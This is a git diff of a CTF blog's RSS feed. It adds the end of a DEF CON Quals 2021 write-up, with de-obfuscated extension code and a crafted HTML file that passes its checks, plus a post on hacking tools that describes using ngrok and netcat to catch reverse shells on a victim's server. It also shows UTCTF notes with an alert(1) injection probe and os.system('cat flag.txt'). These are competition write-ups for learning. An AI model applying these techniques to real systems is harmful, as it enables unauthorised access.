+   <span style="color:#a6e22e">chilen</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x1e6746</span>[<span style="color:#e6db74">&#39;querySelectorAll&#39;</span>](<span style="color:#e6db74">&#39;*&#39;</span>)[<span style="color:#e6db74">&#39;length&#39;</span>], <span style="color:#a6e22e">maxdepth</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">total_attributes</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x1e6746</span>[<span style="color:#e6db74">&#39;attributes&#39;</span>][<span style="color:#e6db74">&#39;length&#39;</span>];
+   <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">_0x28c57b</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">_0x1e6746</span>[<span style="color:#e6db74">&#39;querySelectorAll&#39;</span>](<span style="color:#e6db74">&#39;*&#39;</span>)) {
+       <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x2c0eff</span>[<span style="color:#e6db74">&#39;wmicU&#39;</span>](<span style="color:#a6e22e">getDepth</span>, <span style="color:#a6e22e">_0x28c57b</span>);
+       <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">d</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">maxdepth</span>) <span style="color:#a6e22e">maxdepth</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d</span>;
+       <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_0x28c57b</span>.<span style="color:#a6e22e">attributes</span>) <span style="color:#a6e22e">total_attributes</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">_0x28c57b</span>[<span style="color:#e6db74">&#39;attributes&#39;</span>][<span style="color:#e6db74">&#39;length&#39;</span>];
+   }
+   <span style="color:#a6e22e">specificid</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+   <span style="color:#a6e22e">_0x2c0eff</span>[<span style="color:#e6db74">&#39;ueJYA&#39;</span>](document[<span style="color:#e6db74">&#39;querySelector&#39;</span>](<span style="color:#e6db74">&#39;[tost=&#34;1&#34;]&#39;</span>), <span style="color:#66d9ef">null</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">specificid</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>);
+   <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+   <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_0x2c0eff</span>[<span style="color:#e6db74">&#39;hJFjw&#39;</span>](document[<span style="color:#e6db74">&#39;querySelector&#39;</span>](<span style="color:#a6e22e">_0x2c0eff</span>[<span style="color:#e6db74">&#39;KoOZC&#39;</span>])[<span style="color:#e6db74">&#39;tagName&#39;</span>], <span style="color:#a6e22e">_0x2c0eff</span>[<span style="color:#e6db74">&#39;RkNoD&#39;</span>])) {
+       <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_0x2c0eff</span>[<span style="color:#e6db74">&#39;QwGfh&#39;</span>] <span style="color:#f92672">!==</span> <span style="color:#a6e22e">_0x2c0eff</span>[<span style="color:#e6db74">&#39;IKmUR&#39;</span>]) <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>;
+       <span style="color:#66d9ef">else</span> {
+           <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_0x2351ff</span>() {
+               <span style="color:#66d9ef">return</span>;
+           }
+       }
+   }
+   <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">totalchars</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x1e6746</span>[<span style="color:#e6db74">&#39;innerHTML&#39;</span>][<span style="color:#e6db74">&#39;length&#39;</span>], <span style="color:#a6e22e">_0x2c0eff</span>[<span style="color:#e6db74">&#39;TCJdK&#39;</span>](<span style="color:#a6e22e">_0x2c0eff</span>[<span style="color:#e6db74">&#39;TCJdK&#39;</span>](<span style="color:#a6e22e">_0x2c0eff</span>[<span style="color:#e6db74">&#39;TCJdK&#39;</span>](<span style="color:#a6e22e">_0x2c0eff</span>[<span style="color:#e6db74">&#39;TCJdK&#39;</span>](<span style="color:#a6e22e">chilen</span>, <span style="color:#a6e22e">maxdepth</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">total_attributes</span>, <span style="color:#a6e22e">totalchars</span>), <span style="color:#a6e22e">specificid</span>), <span style="color:#a6e22e">token</span>);
+}
+</code></pre></div><p>The last return sets the value of <code>domvalue</code>. It essentially sums up everything within <code>3fa</code>: <code>total_attributes</code> + <code>totalchars</code> + <code>specificid</code> + <code>token</code> + <code>chilen</code> + <code>maxdepth</code> + <code>innerHTML.length</code> + and maybe some other things, that I couldn&rsquo;t get from the partially de-obfuscated code. That was fine though - because <code>innerHTML.length</code> is added to this value, and we could freely control that to modify <code>domvalue</code> to the number we want.</p>
+<p>The final HTML file is below. It&rsquo;s not pretty.</p>
+<p>With all this information, we now needed some way to actually verify and check when we hit the necessary values for all the local variables. This is where the chrome debugger comes in.</p>
+<p>Load the extension into your browser and open up an html file that serves as the candidate to satisfy the given checks. Placing breakpoints throughout the content script allowed me to take a look at the local variables and see what values they took:</p>
+
+    <img src="/images/DEFCONQUALS2021-allchecksgreen.png"  alt="satisfies all checks"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>And I simply repeated this process until the vars had required values needed for the extension to be happy.</p>
+<p>Now submit your monster html file to admin, and wait for the picture they send back :)</p>
+
+    <img src="/images/DEFCONQUALS2021-flag.png"  alt="satisfies all checks"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>HTML file below:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">body</span>&gt;
+
+ &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;3fa&#34;</span>&gt;
+ 	&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;thirdfactooor&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width: 900px;&#34;</span>&gt;Poggers&lt;/<span style="color:#f92672">input</span>&gt;
+
+ 	&lt;<span style="color:#f92672">button</span>&gt;button1&lt;/<span style="color:#f92672">button</span>&gt;
+
+ 	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nested&#34;</span>&gt;	
+	 &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;div2&#34;</span>&gt;
+	  &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;p1&#34;</span>&gt;You shouldnt see this.&lt;/<span style="color:#f92672">p</span>&gt;
+	&lt;/<span style="color:#f92672">div</span>&gt;
+
+	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;div3&#34;</span>&gt;
+	  &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;p1&#34;</span>&gt;You shouldnt see this.&lt;/<span style="color:#f92672">p</span>&gt;
+	&lt;/<span style="color:#f92672">div</span>&gt;
+
+	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;div4&#34;</span>&gt;
+	  &lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;p1&#34;</span>&gt;You shouldnt see this.&lt;/<span style="color:#f92672">p</span>&gt;
+	&lt;/<span style="color:#f92672">div</span>&gt;
+ 	&lt;/<span style="color:#f92672">div</span>&gt;
+
+
+&lt;/<span style="color:#f92672">div</span>&gt;
+
+
+
+&lt;<span style="color:#f92672">script</span>&gt;
+<span style="color:#75715e">//this is to get the domval to the necessary amount. It&#39;s not pretty :) 
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">one</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createTextNode</span>(<span style="color:#e6db74">&#34;oneiuhfiluhfiulfhsjkdnaljdnakldnawkdhaeluifhefiluhwfujnsdkjnslkajfhbeiwlfhewliufhesukfhnksjdfnkje&#34;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">two</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createTextNode</span>(<span style="color:#e6db74">&#34;two;sijlhkugfhhuijlok;jidlsfgkyuadiuhoijpsoIHRUGLKYEADHIOJDSPOSUDGHKSIFUJADKOSDJIHUFSJFAOKDWJISHUGUFAEIJDWFHUSGUFIAJDWEFHUSGYHUEADIJWEFHUSRFEIJADWOEFHUSRFEAJODWEFHUSGRYIUHEFAJDOWEFHUSAIJo&#34;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">thr</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createTextNode</span>(<span style="color:#e6db74">&#34;thriuhygtftgyuhijutydfgukhilkjthghijhhguhijolhkgyfutyfyguhiljokihytyguhijo;ljtjgkhlj;hcguhhfgjkhljhkuashduahduhdiuhee&#34;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">four</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createTextNode</span>(<span style="color:#e6db74">&#34;foukjhgfghjklkjhghjkjhghjklkjhghjklkjklkjhghjklkjklkjhghjklkjklkjhghjklkjhklkjhklkjhghjklr&#34;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">five</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createTextNode</span>(<span style="color:#e6db74">&#34;pleasegivemethefleguwuasdfsssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss&#34;</span>);
+
+<span style="color:#75715e">//add 5 nodes
+</span><span style="color:#75715e"></span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;3fa&#34;</span>).<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">one</span>);
+document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;3fa&#34;</span>).<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">two</span>);
+document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;3fa&#34;</span>).<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">thr</span>);
+document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;3fa&#34;</span>).<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">four</span>);
+document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;3fa&#34;</span>).<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">five</span>);
+
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">d_nested</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;nested&#34;</span>);
+<span style="color:#75715e">//remove 3 nodes
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">remove2</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;div2&#34;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">remove3</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;div3&#34;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">remove4</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;div4&#34;</span>);
+<span style="color:#a6e22e">r2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d_nested</span>.<span style="color:#a6e22e">removeChild</span>(<span style="color:#a6e22e">remove2</span>);
+<span style="color:#a6e22e">r3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d_nested</span>.<span style="color:#a6e22e">removeChild</span>(<span style="color:#a6e22e">remove3</span>);
+<span style="color:#a6e22e">r4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d_nested</span>.<span style="color:#a6e22e">removeChild</span>(<span style="color:#a6e22e">remove4</span>);
+
+
+<span style="color:#75715e">// attributename = 23 chars
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buttatt1</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementsByTagName</span>(<span style="color:#e6db74">&#34;BUTTON&#34;</span>)[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;namenamenamenamenamenam&#34;</span>, <span style="color:#e6db74">&#34;pleasegivemetheflag&#34;</span>);
+
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+
+&lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div>]]></content>
+        </item>
+        
+        <item>
+            <title>Commonly Used Software 2: Electric Boogaloo</title>
+            <link>https://jamvie.net/posts/2021/04/commonly-used-software-2-electric-boogaloo/</link>
+            <pubDate>Wed, 07 Apr 2021 23:10:50 -0600</pubDate>
+            
+            <guid>https://jamvie.net/posts/2021/04/commonly-used-software-2-electric-boogaloo/</guid>
+            <description>I figured I would make an update to this post from long ago, back when I first made this site. It&amp;rsquo;s kinda funny (and a lil cringy) to look back on it now given how I ended up completely deviating from that list and use an entirely new suite of tools. Actually, one year into CTFs and I&amp;rsquo;d consider my kit to be far smaller than it originally was. Funny how that works, no?</description>
+            <content type="html"><![CDATA[<p>I figured I would make an update to this <a href="/posts/2020/04/commonly-used-software/">post</a> from long ago, back when I first made this site. It&rsquo;s kinda funny (and a lil cringy) to look back on it now given how I ended up completely deviating from that list and use an entirely new suite of tools. Actually, one year into CTFs and I&rsquo;d consider my kit to be far smaller than it originally was. Funny how that works, no?</p>
+<p>The entire motive behind that post was to give a quick, general overview of the sorts of tools I felt like you should familarize yourself with to plunge into web exploits. This isn&rsquo;t to say that I no longer think that, the software available to us today is incredibly useful as an ethical hacker, but I felt this update important to subtly showcase my growth as a hacker through the tools I use (or don&rsquo;t use).</p>
+<p>Now, on to the new list.</p>
+<h2 id="1-ngrok">1. ngrok</h2>
+<p><em><a href="https://ngrok.com/">Link</a></em></p>
+<p>I love ngrok. It&rsquo;s easily my most utilized tool. It&rsquo;s great for literally anything, since at its core it&rsquo;s just a tunneler to expose a port on your localhost. Spin up a quick HTTP server and open ngrok on that same port, and now you have a public HTTP server. Start up a netcat listener and use ngrok on TCP mode, and now all you need is a reverse shell payload to be executed on some poor victim&rsquo;s server. The possibilities are endless.</p>
+<h2 id="2-python">2. Python</h2>
+<p><em><a href="https://www.python.org/">Link</a></em></p>
+<p>Can I call Python a tool? It&rsquo;s my scripting language of choice. One year ago, my Python skills were pretty barren (I was a staunch believer in C# supremacy. Microsoft, heyy) - now, most if not all of my coding (from scripts to full-fledged programs) are done in Python. It&rsquo;s remarkably easy to create anything with it. ALL of my ctf scripts are in Python, and most of my academic projects are also written in it. Not only that, but Python comes with an incredible library called <a href="https://github.com/Gallopsled/pwntools">pwntools</a> containing just about everything you could ever want in a CTF-centered package.</p>
+<hr>
+<p>Yea. That&rsquo;s it. I still use Wireshark and Burpsuite occasionally, and I naturally use the terminal for all CTFs so I can&rsquo;t escape CURL, but honestly analyzing my usage of tools I realized that I have seriously downsized. What does this mean for me?</p>
+<p>Well for one, I&rsquo;m <strong>not</strong> saying that the software outlined in my previous post are obsolete. They&rsquo;re most definitely not - Burpsuite, for example, is a powerful web pentesting tool with so much functionality that industry professionals use it today. Like I mentioned earlier, I still use Burpsuite, I just don&rsquo;t use it in the same way I did before. I found that earlier on in my CTF journey I relied on external tools a little <em>too</em> much to do the hard work, which isn&rsquo;t the most productive way to learn.</p>
+<p>Perhaps the biggest takeaway here is to acknowledge how much I have grown since even a year ago. There&rsquo;s a wealth of information about cybersecurity out there, constantly being added to and amended, and the process of learning never really &ldquo;completes&rdquo;. But, you can always take a look back and remark at how much you&rsquo;ve changed based on the little things that have adapted to accomodate your more experienced lifestyle. I thought that I needed several different tools to employ many different web-based exploits. Realistically, I wasn&rsquo;t using them in a productive manner - hoping that the software that I dumped the brunt work on would help me progress my own skills. What was I learning by allowing a script to automate the effort?</p>
+<p>The shrinking of this list is proof that I have become self-sufficient in the way of CTFs. Maybe more confident, too. I&rsquo;m happy that the progress is evident whenever I take a step back and look at how far I have come. A year&rsquo;s worth of progress can really be alot.</p>
+<p><strong>Vie</strong></p>
+]]></content>
+        </item>
         
         <item>
             <title>Bo1lersCTF 2021: Lorem_Ipsum</title>
@@ -108,14 +398,14 @@ private_bits <span style="color:#f92672">=</span> [
             <guid>https://jamvie.net/posts/2021/03/utctf-2021/</guid>
             <description>Lightning Round The first few web challenges were pretty trivial so I&amp;rsquo;ll do super quick, 2-sentence descriptions on how to solve them.
 Source it! Inspect source. You&amp;rsquo;ll find it.
-Oinker Make an oink with the exact same content and realize that each oink has an allocated place in the webpage&amp;rsquo;s directory. (Example - inputting alert(1)l leads to oink endpoint 64). Go to \oink\2 to get the flag.
+Oinker Make an oink with the exact same content and realize that each oink has an allocated place in the webpage&amp;rsquo;s directory. (Example - inputting alert(1); leads to oink endpoint 64). Go to \oink\2 to get the flag.
 Fastfox (easy way) Intended (hard) solution was escalating a JIT bug, which I will definitely research more of so expect part 2 ;) but the easy way was determining what functions were available in the scope of Bob&amp;rsquo;s jsshell.</description>
             <content type="html"><![CDATA[<h2 id="lightning-round">Lightning Round</h2>
 <p>The first few web challenges were pretty trivial so I&rsquo;ll do super quick, 2-sentence descriptions on how to solve them.</p>
 <h3 id="source-it">Source it!</h3>
 <p>Inspect source. You&rsquo;ll find it.</p>
 <h3 id="oinker">Oinker</h3>
-<p>Make an oink with the exact same content and realize that each oink has an allocated place in the webpage&rsquo;s directory. (Example - inputting <code>alert(1)l</code> leads to oink endpoint 64). Go to <a href="http://web2.utctf.live:5320/oink/2">\oink\2</a> to get the flag.</p>
+<p>Make an oink with the exact same content and realize that each oink has an allocated place in the webpage&rsquo;s directory. (Example - inputting <code>alert(1);</code> leads to oink endpoint 64). Go to <code>\oink\2</code> to get the flag.</p>
 <h3 id="fastfox-easy-way">Fastfox (easy way)</h3>
 <p>Intended (hard) solution was escalating a JIT bug, which I will definitely research more of so expect part 2 ;) but the easy way was determining what functions were available in the scope of Bob&rsquo;s jsshell. Some recon shows us that <code>os.system()</code> is in the scope, so <code>os.system('cat flag.txt')</code> gives you the flag.</p>
 <hr>
